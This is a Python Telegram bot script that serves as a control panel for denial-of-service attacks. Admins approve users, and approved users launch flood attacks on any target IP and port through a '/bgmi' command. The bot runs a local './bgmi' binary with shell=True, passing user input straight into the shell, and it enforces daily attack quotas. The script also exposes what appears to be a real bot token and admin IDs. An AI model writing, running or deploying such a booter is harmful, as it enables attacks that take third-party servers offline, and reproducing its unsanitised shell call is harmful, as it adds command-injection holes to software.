#!/usr/bin/python3

import telebot
import subprocess
import datetime
import time

# Insert your Telegram bot token here
bot = telebot.TeleBot('7251662898:AAEUpUpsDz2ncdGN0Hjvw66YZfTyPcFKAhY')

# Admin user IDs
admin_id = ["1383324178", "6060545769", "1871909759"]

# File to store approved users with approval times
APPROVED_USERS_FILE = "approved_users.txt"

# Dictionary to track user attacks per day
user_attacks = {}
reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
MAX_ATTACKS_PER_DAY = 20

# Reset attack count at midnight
def reset_attack_counts():
    global reset_time, user_attacks
    if datetime.datetime.now() >= reset_time:
        user_attacks = {}
        reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)

# Read approved users and their approval times
def read_approved_users():
    approved_users = {}
    try:
        with open(APPROVED_USERS_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(",")
                if len(parts) == 2:
                    user_id, approval_time = parts
                    approved_users[user_id] = approval_time
    except FileNotFoundError:
        pass
    return approved_users

# Store approved users in dictionary
approved_users = read_approved_users()

# ✅ Command: /approve <user_id> (Admins Only)
@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 Only Admins Can Approve Users!")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /approve <user_id>")
        return

    target_user_id = command_parts[1]
    approval_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if target_user_id not in approved_users:
        approved_users[target_user_id] = approval_time
        with open(APPROVED_USERS_FILE, "a") as file:
            file.write(f"{target_user_id},{approval_time}\n")
        response = f"✅ User {target_user_id} has been approved at {approval_time}."
    else:
        response = f"⚠️ User {target_user_id} is already approved."

    bot.reply_to(message, response)

# ✅ Command: /bgmi <target> <port> <time> (Start Attack)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    reset_attack_counts()
    user_id = str(message.chat.id)

    if user_id not in approved_users:
        bot.reply_to(message, "🚫 You are not approved for attacks. Contact an admin for approval.")
        return

    if user_attacks.get(user_id, 0) >= MAX_ATTACKS_PER_DAY:
        bot.reply_to(message, "🚫 You have reached your daily limit of 20 attacks. Try again tomorrow.")
        return

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        duration = int(command[3])

        if duration > 300:
            bot.reply_to(message, "Error: Time interval must be less than 300.")
            return

        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
        remaining_attacks = MAX_ATTACKS_PER_DAY - user_attacks[user_id]

        # Notify user that the attack has started
        start_msg = f"🔥 Attack Started!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {duration} seconds"
        bot.reply_to(message, start_msg)

        # Notify admins
        attack_info = f"🚨 **Attack Alert** 🚨\n" \
                      f"👤 User ID: {user_id}\n" \
                      f"🎯 Target: {target}\n" \
                      f"🔢 Port: {port}\n" \
                      f"⏳ Duration: {duration} seconds\n" \
                      f"🔥 Remaining Attacks: {remaining_attacks} / {MAX_ATTACKS_PER_DAY}"
        
        for admin in admin_id:
            bot.send_message(admin, attack_info)

        # Execute the attack
        full_command = f"./bgmi {target} {port} {duration}"
        subprocess.run(full_command, shell=True)

        # Wait for attack to complete
        time.sleep(duration)

        # Notify user that attack has ended
        end_msg = f"✅ Attack Finished!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {duration} seconds"
        bot.send_message(user_id, end_msg)

    else:
        bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")

# Run the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
